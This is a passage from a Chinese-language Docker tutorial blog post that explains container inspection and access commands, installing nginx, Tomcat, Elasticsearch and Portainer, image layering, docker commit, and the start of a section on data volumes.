<li><code>centos</code> 参数表示使用的镜像名称，这里使用的是 CentOS 镜像。</li>
<li><code>/bin/bash -c &quot;while true;do echo zyy hello;sleep 1;done&quot;</code> 参数表示在容器内部执行的 shell 命令。其中 <code>/bin/bash</code> 是 shell 的路径，<code>-c</code> 参数表示在 shell 中执行指定的命令。这里的命令是一个无限循环，不停地输出字符串 “zyy hello”。</li>
</ul>
<blockquote>
<p>查看容器中的进程信息</p>
</blockquote>
<p>docker top 容器id</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class="line">4ee256515d6e   centos    <span class="string">&quot;/bin/bash&quot;</span>   4 seconds ago   Up 3 seconds             frosty_swartz</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker top 4ee256515d6e</span></span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                2564662             2564639             0                   10:33               pts/0               00:00:00            /bin/bash</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看镜像的元数据</p>
</blockquote>
<p>docker inspect 容器id<br>元数据 (meta data)——“data about data” 描述数据的数据，一般是结构化数据 </p>
<p>元数据是指从信息资源中抽取出来的用于说明其特征、内容的结构化的数据(如题名,版本、出版数据、相关说明,包括检索点等)，用于组织、描述、检索、保存、管理信息和知识资源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker inspect 4ee256515d6e</span></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;Id&quot;</span>: <span class="string">&quot;4ee256515d6e776f4e2b6e8e80d1a65b67635347465ba27a08035cffb3f01983&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Created&quot;</span>: <span class="string">&quot;2024-09-22T02:33:02.5872125Z&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Path&quot;</span>: <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Args&quot;</span>: [],</span><br><span class="line">        <span class="string">&quot;State&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Status&quot;</span>: <span class="string">&quot;running&quot;</span>,</span><br><span class="line">........</span><br></pre></td></tr></table></figure>

<blockquote>
<p>进入当前正在运行的容器</p>
</blockquote>
<p><strong>方式一：docker exec</strong></p>
<p>docker exec -it 容器id &#x2F;bin&#x2F;bash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker exec -it 4ee256515d6e /bin/sh</span></span><br><span class="line">sh-4.4<span class="comment"># ls</span></span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure>

<p><strong>方式二：docker attach</strong></p>
<p>docker attach 容器id</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker attach 4ee256515d6e</span></span><br><span class="line">[root@4ee256515d6e /]<span class="comment"># ls</span></span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure>

<p>区别</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker exec       # 进入容器后开启一个新的终端，可以在里面操作</span></span><br><span class="line"><span class="comment"># docker attach     # 进入容器正在执行的终端，不会启动新的进程</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>从容器拷贝到主机上、从主机拷贝到容器上</p>
</blockquote>
<p>docker   cp   容器id:容器文件   主机路径</p>
<p>docker   cp   主机文件   容器id:容器路径</p>
<h2 id="5、命令大全"><a href="#5、命令大全" class="headerlink" title="5、命令大全"></a>5、命令大全</h2><p><a href="https://pythondjango.cn/python/tools/2-docker-dockerfile/">https://pythondjango.cn/python/tools/2-docker-dockerfile/</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/a35078a4e14770dc23e9e96e77b8fa78--3ca0--image-20240922104456381.png" alt="image-20240922104456381"></p>
<h1 id="四、Docker的使用练习"><a href="#四、Docker的使用练习" class="headerlink" title="四、Docker的使用练习"></a>四、Docker的使用练习</h1><h2 id="1、Docker安装nginx"><a href="#1、Docker安装nginx" class="headerlink" title="1、Docker安装nginx"></a>1、Docker安装nginx</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker pull nginx 1、 拉取nginx</span></span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/nginx</span><br><span class="line">a2318d6c47ec: Pull complete </span><br><span class="line">095d327c79ae: Pull complete </span><br><span class="line">bbfaa25db775: Pull complete </span><br><span class="line">7bb6fb0cfb2b: Pull complete </span><br><span class="line">0723edc10c17: Pull complete </span><br><span class="line">24b3fdc4d1e3: Pull complete </span><br><span class="line">3122471704d5: Pull complete </span><br><span class="line">Digest: sha256:04ba374043ccd2fc5c593885c0eacddebabd5ca375f9323666f28dfd5a9710e3</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> nginx:latest</span><br><span class="line">docker.io/library/nginx:latest</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">nginx         latest    39286ab8a5e1   5 weeks ago     188MB</span><br><span class="line">hello-world   latest    d2c94e258dcb   16 months ago   13.3kB</span><br><span class="line">centos        latest    5d0da3dc9764   3 years ago     231MB</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -it -d --name nginx01 -p 3344:80 nginx 启动nginx</span></span><br><span class="line">6c511e58320a06a81eeec1708d7fecd85486d8b879711ab3993e6599849cb5d6</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps  查看nginx容器</span></span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED          STATUS          PORTS                                   NAMES</span><br><span class="line">6c511e58320a   nginx     <span class="string">&quot;/docker-entrypoint.…&quot;</span>   28 seconds ago   Up 28 seconds   0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp   nginx01</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/427e9af89ddfbabc7c02f78814a92408--610e--image-20240922105436716.png" alt="image-20240922105436716"></p>
<p>成功搭建（注意这里需要服务器开启对应的3344端口，外界才能访问到）</p>
<p><strong><code>docker run -it -d --name nginx02 -p 3344:80 nginx</code>解释</strong></p>
<ul>
<li><code>docker run</code>：启动一个新的容器</li>
<li><code>-it</code>：表示启用交互式终端并分配一个伪终端，这样我们可以在容器中交互式地执行命令。</li>
<li><code>-d</code>：表示将容器运行在后台（守护进程）。</li>
<li><code>--name nginx02</code>：给容器起一个名字叫做 <code>nginx02</code>。</li>
<li><code>-p 3344:80</code>：将主机的 3344 端口映射到容器的 80 端口，这样我们就可以通过主机的 3344 端口来访问容器内的 Nginx 服务。</li>
<li><code>nginx</code>：表示要启动的镜像名称为 <code>nginx</code>。</li>
</ul>
<p>因此，这个命令的作用是在 Docker 中启动一个名为 <code>nginx02</code> 的容器，运行 Nginx 服务，并将容器的 80 端口映射到主机的 3344 端口，以便我们可以通过访问主机的 3344 端口来访问 Nginx 服务。容器会在后台运行，并启用交互式终端。</p>
<h2 id="2、安装一个tomcat"><a href="#2、安装一个tomcat" class="headerlink" title="2、安装一个tomcat"></a>2、安装一个tomcat</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker pull tomcat  拉取镜像</span></span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/tomcat</span><br><span class="line">32b824d45c61: Pull complete </span><br><span class="line">fe18bb7e114f: Pull complete </span><br><span class="line">581ebfe08d3f: Pull complete </span><br><span class="line">7c7bdd063feb: Pull complete </span><br><span class="line">28f1e2918031: Pull complete </span><br><span class="line">dbce9ebf04f0: Pull complete </span><br><span class="line">4f4fb700ef54: Pull complete </span><br><span class="line">2963b9c3d96f: Pull complete </span><br><span class="line">Digest: sha256:0298f25ea8171042fe610457ff0fd72382d36a144eae4483e2784bbbae31d68b</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> tomcat:latest</span><br><span class="line">docker.io/library/tomcat:latest</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -d -p 3355:8080 --name tomcat01 tomcat  启动容器</span></span><br><span class="line">c0186e2559f5fe67ca6b32f386859ea1a3028572c42c93237ef746581c59361e</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/9711f3688d4cf560af0826f568ab9078--c194--image-20240922110708559.png" alt="image-20240922110708559"></p>
<p>发现服务可以访问，但是没有页面</p>
<p>进入服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker exec -it c0186e2559 /bin/bash 进入容器</span></span><br><span class="line">root@c0186e2559f5:/usr/local/tomcat/webapps<span class="comment"># ls</span></span><br></pre></td></tr></table></figure>

<p>发现webapp下为空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 原因：阿里云镜像的原因，阿里云默认是最小的镜像，所以不必要的都剔除掉</span><br><span class="line"># 保证最小可运行的环境！</span><br></pre></td></tr></table></figure>

<p>解决方案：将webapps.dist下的文件都拷贝到webapps下即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@c0186e2559f5:/usr/local/tomcat<span class="comment"># cp -r webapps.dist/* webapps</span></span><br></pre></td></tr></table></figure>

<p>刷新一下服务，就有页面了</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/8f92f4b563b758a8b61da0eaabd8e257--ae1f--image-20240922111002319.png" alt="image-20240922111002319"></p>
<p>问题:我们以后要部署项目，如果每次都要进入容器是不是十分麻烦？要是可以在容器外部提供一个映射路径，比如webapps，我们在外部放置项目，就自动同步内部就好了！</p>
<h2 id="3、Docker安装Elesticsearch"><a href="#3、Docker安装Elesticsearch" class="headerlink" title="3、Docker安装Elesticsearch"></a>3、Docker安装Elesticsearch</h2><p>elasticsearch暴露的端口很多</p>
<p>十分耗内存（所以体现测试的时候可以提前把其他docker容器先停止，启动时可以限制堆内存大小）</p>
<p>es 的数据一般需要放置到安全目录！挂载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -d --name es -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot; elasticsearch:7.6.2</span></span><br><span class="line">Unable to find image <span class="string">&#x27;elasticsearch:7.6.2&#x27;</span> locally</span><br><span class="line">7.6.2: Pulling from library/elasticsearch</span><br><span class="line">ab5ef0e58194: Pull complete </span><br><span class="line">c4d1ca5c8a25: Pull complete </span><br><span class="line">941a3cc8e7b8: Pull complete </span><br><span class="line">43ec483d9618: Pull complete </span><br><span class="line">c486fd200684: Pull complete </span><br><span class="line">1b960df074b2: Pull complete </span><br><span class="line">1719d48d6823: Pull complete </span><br><span class="line">Digest: sha256:1b09dbd93085a1e7bca34830e77d2981521a7210e11f11eda997add1c12711fa</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> elasticsearch:7.6.2</span><br><span class="line">6861a387a1cac6856d948d54b5ec3db63b04f762d0deb2a7f7ba4e77af3d7a62</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># curl localhost:9200</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span> : <span class="string">&quot;6861a387a1ca&quot;</span>,</span><br><span class="line">  <span class="string">&quot;cluster_name&quot;</span> : <span class="string">&quot;docker-cluster&quot;</span>,</span><br><span class="line">  <span class="string">&quot;cluster_uuid&quot;</span> : <span class="string">&quot;b2Wz4EljT7qCteo0VMyFMQ&quot;</span>,</span><br><span class="line">  <span class="string">&quot;version&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;number&quot;</span> : <span class="string">&quot;7.6.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_flavor&quot;</span> : <span class="string">&quot;default&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_type&quot;</span> : <span class="string">&quot;docker&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_hash&quot;</span> : <span class="string">&quot;ef48eb35cf30adf4db14086e8aabd07ef6fb113f&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_date&quot;</span> : <span class="string">&quot;2020-03-26T06:34:37.794943Z&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_snapshot&quot;</span> : <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;lucene_version&quot;</span> : <span class="string">&quot;8.4.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;minimum_wire_compatibility_version&quot;</span> : <span class="string">&quot;6.8.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;minimum_index_compatibility_version&quot;</span> : <span class="string">&quot;6.0.0-beta1&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;tagline&quot;</span> : <span class="string">&quot;You Know, for Search&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker stats   #查看cpu状态</span></span><br><span class="line">CONTAINER ID   NAME      CPU %     MEM USAGE / LIMIT     MEM %     NET I/O           BLOCK I/O         PIDS</span><br><span class="line">6861a387a1ca   es        3.26%     368.8MiB / 1.918GiB   18.78%    4.11kB / 3.75kB   6.16MB / 2.03MB   45</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/b2631e9ff0347714db21901b08846644--be00--image-20240922112744309.png" alt="image-20240922112744309"></p>
<p><strong><code>docker run -d --name es -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot; elasticsearch:7.6.2</code>命令解释</strong></p>
<p>这是一个使用 Docker 命令行工具来启动一个 Elasticsearch 版本为 7.6.2 的容器，并设置了一些选项和参数。</p>
<p>具体来说，这些选项和参数的含义如下：</p>
<ul>
<li><code>-d</code> 表示在后台运行容器，即以“守护进程”模式运行，不会占用当前终端的控制台；</li>
<li><code>--name es</code> 表示给容器起一个名称为 “es”；</li>
<li><code>-p 9200:9200 -p 9300:9300</code> 表示将容器内部的 9200 端口和 9300 端口映射到主机的 9200 和 9300 端口上，以便在主机上通过浏览器或客户端连接 Elasticsearch；</li>
<li><code>-e &quot;discovery.type=single-node&quot;</code> 表示设置 Elasticsearch 的节点类型为 “single-node”，即单节点模式，这是一个简单的运行 Elasticsearch 的方式，适用于测试或开发环境；</li>
<li><code>-e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot;</code> 表示设置 Elasticsearch 的 Java 虚拟机参数，其中 “-Xms64m” 表示设置初始堆大小为 64MB，”-Xmx512m” 表示设置最大堆大小为 512MB；</li>
<li><code>elasticsearch:7.6.2</code> 表示要运行的容器镜像名称和版本号，这里是 Elasticsearch 官方提供的 7.6.2 版本。</li>
</ul>
<p>总体来说，这个命令的作用是在 Docker 中启动一个 Elasticsearch 7.6.2 的容器，并将容器内部的端口映射到主机上，以便在主机上访问 Elasticsearch。其中的选项和参数可以根据需要进行修改或调整。</p>
<h1 id="五、portainer可视化面板安装"><a href="#五、portainer可视化面板安装" class="headerlink" title="五、portainer可视化面板安装"></a>五、portainer可视化面板安装</h1><ul>
<li>portainer(先用这个)</li>
<li>rancher(CI&#x2F;DI再用)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</span></span><br><span class="line">Unable to find image <span class="string">&#x27;portainer/portainer:latest&#x27;</span> locally</span><br><span class="line">latest: Pulling from portainer/portainer</span><br><span class="line">772227786281: Pull complete </span><br><span class="line">96fd13befc87: Pull complete </span><br><span class="line">0bad1d247b5b: Pull complete </span><br><span class="line">b5d1b01b1d39: Pull complete </span><br><span class="line">Digest: sha256:47b064434edf437badf7337e516e07f64477485c8ecc663ddabbe824b20c672d</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> portainer/portainer:latest</span><br><span class="line">8de613bef9cc0af508c8db2433789ee570f1a7737260130c36ab03d7fcfd54a9</span><br></pre></td></tr></table></figure>

<p><strong><code>docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</code>解释</strong></p>
<p>这是一个用于运行 Docker 容器的 Docker 命令。具体来说，该命令启动了一个名为 Portainer 的 Docker 容器，并将容器的 9000 端口映射到主机的 8088 端口，以便在主机上通过浏览器访问 Portainer。</p>
<p>以下是各个参数的含义：</p>
<ul>
<li><code>-d</code>：表示以后台模式运行容器。</li>
<li><code>-p 8088:9000</code>：表示将容器的 9000 端口映射到主机的 8088 端口。</li>
<li><code>--restart=always</code>：表示容器在停止后总是会自动重启。</li>
<li><code>-v /var/run/docker.sock:/var/run/docker.sock</code>：表示将主机的 Docker 守护进程的 Unix 套接字文件（&#x2F;var&#x2F;run&#x2F;docker.sock）挂载到容器的同一位置，从而让 Portainer 可以管理主机上的其他 Docker 容器。</li>
<li><code>--privileged=true</code>：表示在容器中开启特权模式，以便 Portainer 能够访问主机上的 Docker 守护进程。</li>
</ul>
<p>总之，这个命令的作用是在主机上启动一个 Portainer 容器，以便通过 web 界面来管理和监控其他 Docker 容器。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/5ed9c8b958e7da80cce2ec4be260697e--a128--image-20240922151045620.png" alt="image-20240922151045620"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/1723b6decc7608a24c3ab59cf2dadd75--6e31--image-20240922151150791.png" alt="image-20240922151150791"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/3af376d05b8b74bd529ba6cee95b464d--6a23--image-20240922151227485.png" alt="image-20240922151227485"></p>
<ul>
<li>使用图形化界面对docker容器镜像进行对应的管理</li>
</ul>
<h1 id="六、Docker镜像"><a href="#六、Docker镜像" class="headerlink" title="六、Docker镜像"></a>六、Docker镜像</h1><h2 id="1、镜像是什么"><a href="#1、镜像是什么" class="headerlink" title="1、镜像是什么"></a>1、镜像是什么</h2><p>镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含</p>
<p>运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p>
<h2 id="2、Docker镜像加载原理"><a href="#2、Docker镜像加载原理" class="headerlink" title="2、Docker镜像加载原理"></a>2、Docker镜像加载原理</h2><blockquote>
<p>UnionFS(联合文件系统)</p>
</blockquote>
<p>UnionFS（联合文件系统）：Union文件系统（UnionFS）是一种分层、轻量级并且高性能的文件系统，</p>
<p>它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系</p>
<p>统下(unite several directories into a single virtual fifilesystem)。Union 文件系统是 Docker 镜像的基</p>
<p>础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。</p>
<p>特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件</p>
<p>系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录</p>
<blockquote>
<p>docker镜像加载原理</p>
</blockquote>
<p>docker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。</p>
<p>bootfs(boot fifile system)主要包含bootloader和kernel, bootloader主要是引导加载kernel, Linux刚启</p>
<p>动时会加载bootfs文件系统，在Docker镜像的最底层是bootfs。这一层与我们典型的Linux&#x2F;Unix系统是</p>
<p>一样的，包含boot加载器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已</p>
<p>由bootfs转交给内核，此时系统也会卸载bootfs。 </p>
<p>rootfs (root fifile system) ，在bootfs之上。包含的就是典型 Linux 系统中的 &#x2F;dev, &#x2F;proc, &#x2F;bin, &#x2F;etc 等标</p>
<p>准目录和文件。rootfs就是各种不同的操作系统发行版，比如Ubuntu，Centos等等。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/6bbe15637a9c22909ba22cf0ea4aa6d0--89e1--image-20240922152448693.png" alt="image-20240922152448693"></p>
<p>平时我们安装进虚拟机的CentOS都是好几个G，为什么Docker这里才200M？</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/bbdf1be4d587d57210e07181711d1724--2253--image-20240922152528402.png" alt="image-20240922152528402"></p>
<p>对于一个精简的OS，rootfs 可以很小，只需要包含最基本的命令，工具和程序库就可以了，因为底层直</p>
<p>接用Host的kernel，自己只需要提供rootfs就可以了。由此可见对于不同的linux发行版, bootfs基本是一</p>
<p>致的, rootfs会有差别, 因此不同的发行版可以公用bootfs。 </p>
<h2 id="3、分层理解"><a href="#3、分层理解" class="headerlink" title="3、分层理解"></a>3、分层理解</h2><p>我们可以去下载一个镜像，注意观察下载的日志输出，可以看到是一层一层的在下载！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker pull redis</span></span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/redis</span><br><span class="line">a2318d6c47ec: Pull complete </span><br><span class="line">ed7fd66f27f2: Pull complete </span><br><span class="line">410a3d5b3155: Pull complete </span><br><span class="line">9312cf3f6b3e: Pull complete </span><br><span class="line">c39877ab23d0: Pull complete </span><br><span class="line">01394ffc7248: Pull complete </span><br><span class="line">4f4fb700ef54: Pull complete </span><br><span class="line">5a03cb6163ab: Pull complete </span><br><span class="line">Digest: sha256:eadf354977d428e347d93046bb1a5569d701e8deb68f090215534a99dbcb23b9</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> redis:latest</span><br><span class="line">docker.io/library/redis:latest</span><br></pre></td></tr></table></figure>

<p>思考：为什么Docker镜像要采用这种分层的结构呢？</p>
<p>最大的好处，我觉得莫过于是资源共享了！比如有多个镜像都从相同的Base镜像构建而来，那么宿主机</p>
<p>只需在磁盘上保留一份base镜像，同时内存中也只需要加载一份base镜像，这样就可以为所有的容器服</p>
<p>务了，而且镜像的每一层都可以被共享。</p>
<p>查看镜像分层的方式可以通过 <code>docker image inspect</code> 命令！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;RootFS&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Type&quot;</span>: <span class="string">&quot;layers&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Layers&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;sha256:8e2ab394fabf557b00041a8f080b10b4e91c7027b7c174f095332c7ebb6501cb&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sha256:9a978e3d8066b448323af0ea471da443c1e9da9dd8d0663d380b6af6a5ef14ed&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sha256:a64e92ee12394b08486442cb272116d6b0a4f363748434316a2e9ed2fdd379c0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sha256:40710ab1222c055362a531507662df6177a4a2c97095b5ead8389c1e5b797615&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sha256:15ef09f0323042ab4d842cd2d5d53d1cdd99414ee787d08f7d7064bf69d2d146&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sha256:e4dbf0bd9d9df4561e608086d426c8edca8dd2fd9b83b2bc76b4fbc88066fc1d&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sha256:5f70bf18a086007016e948b04aed3b82103a36bea41755b6cddfaf10ace3c6ef&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sha256:950a085c0a1cd3e27102081e4a7bfb4bd0a624325b1cd3caf71f0d5f5eced6b6&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>理解：</p>
<p>所有的 Docker 镜像都起始于一个基础镜像层，当进行修改或增加新的内容时，就会在当前镜像层之</p>
<p>上，创建新的镜像层。</p>
<p>举一个简单的例子，假如基于 Ubuntu Linux 16.04 创建一个新的镜像，这就是新镜像的第一层；如果</p>
<p>在该镜像中添加 Python包，就会在基础镜像层之上创建第二个镜像层；如果继续添加一个安全补丁，就</p>
<p>会创建第三个镜像层。</p>
<p>该镜像当前已经包含 3 个镜像层，如下图所示（这只是一个用于演示的很简单的例子）。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/f9c144e64ca90a0bb064c43099abc990--97ab--image-20240922152707544.png" alt="image-20240922152707544"></p>
<p>上图中的镜像层跟之前图中的略有区别，主要目的是便于展示文件。</p>
<p>下图中展示了一个稍微复杂的三层镜像，在外部看来整个镜像只有 6 个文件，这是因为最上层中的文件</p>
<p>7 是文件 5 的一个更新版本。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/89e58c04d92f0d2023bf15fba34c7dc9--1bf4--image-20240922152716981.png" alt="image-20240922152716981"></p>
<p>这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为一个新</p>
<p>镜像层添加到镜像当中。</p>
<p>Docker 通过存储引擎（新版本采用快照机制）的方式来实现镜像层堆栈，并保证多镜像层对外展示为统</p>
<p>一的文件系统。</p>
<p>Linux 上可用的存储引擎有 AUFS、Overlay2、Device Mapper、Btrfs 以及 ZFS。顾名思义，每种存储</p>
<p>引擎都基于 Linux 中对应的文件系统或者块设备技术，并且每种存储引擎都有其独有的性能特点。</p>
<p>Docker 在 Windows 上仅支持 windowsfifilter 一种存储引擎，该引擎基于 NTFS 文件系统之上实现了分</p>
<p>层和 CoW。</p>
<p>下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并，对外提供统一的视图。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/1a734a4154eeeaac48593ce23297d7ad--628f--image-20240922152734675.png" alt="image-20240922152734675"></p>
<blockquote>
<p>特点</p>
</blockquote>
<p>Docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部！</p>
<p>这一层就是我们通常说的容器层，容器之下的都叫镜像层！</p>
<h2 id="4、镜像commit"><a href="#4、镜像commit" class="headerlink" title="4、镜像commit"></a>4、镜像commit</h2><p><strong>docker commit</strong> <strong>从容器创建一个新的镜像。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker commit 提交容器副本使之成为一个新的镜像！</span><br><span class="line"></span><br><span class="line"># 语法 </span><br><span class="line">docker commit -m=&quot;提交的描述信息&quot; -a=&quot;作者&quot; 容器id 要创建的目标镜像名:[标签名]</span><br></pre></td></tr></table></figure>

<p>实际操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -it -p 3355:8080 --name tomcat01 tomcat  启动tomcat</span></span><br><span class="line">root@c8e254e9555b:/usr/local/tomcat<span class="comment"># cp -r webapps.dist/* webapps   进行tomcat的修改</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker commit -a=&quot;6pc1&quot; -m=&quot;add webapps tomcat&quot; c8e254e9555b mytomcat:1.0  将新的容器提交</span></span><br><span class="line">sha256:c4cc1b3de0ff0849bccb0dffa83397f0a6ff1af3a4907bca933856a5da04745a</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker images  成功提交对应镜像</span></span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED          SIZE</span><br><span class="line">mytomcat     1.0       c4cc1b3de0ff   13 seconds ago   474MB</span><br><span class="line">tomcat       latest    7f14c7d5cf60   4 days ago       469MB</span><br><span class="line">redis        latest    590b81f2fea1   7 weeks ago      117MB</span><br><span class="line">centos       latest    5d0da3dc9764   3 years ago      231MB</span><br></pre></td></tr></table></figure>

<p>如果你想要保存你当前的状态，可以通过commit，来提交镜像，方便使用，类似于 VM 中的快照！</p>
<h1 id="七、容器数据卷"><a href="#七、容器数据卷" class="headerlink" title="七、容器数据卷"></a>七、容器数据卷</h1><h2 id="1、什么是容器数据卷"><a href="#1、什么是容器数据卷" class="headerlink" title="1、什么是容器数据卷"></a>1、什么是容器数据卷</h2><p><strong>docker的理念回顾：</strong></p>
<p>将应用和运行的环境打包形成容器运行，运行可以伴随着容器，但是我们对于数据的要求，是希望能够</p>
<p>持久化的！</p>
<p>就好比，你安装一个MySQL，结果你把容器删了，就相当于删库跑路了，这TM也太扯了吧！</p>
<p>所以我们希望容器之间有可能可以共享数据，Docker容器产生的数据，如果不通过docker commit 生成</p>
<p>新的镜像，使得数据作为镜像的一部分保存下来，那么当容器删除后，数据自然也就没有了！这样是行</p>
<p>不通的！</p>
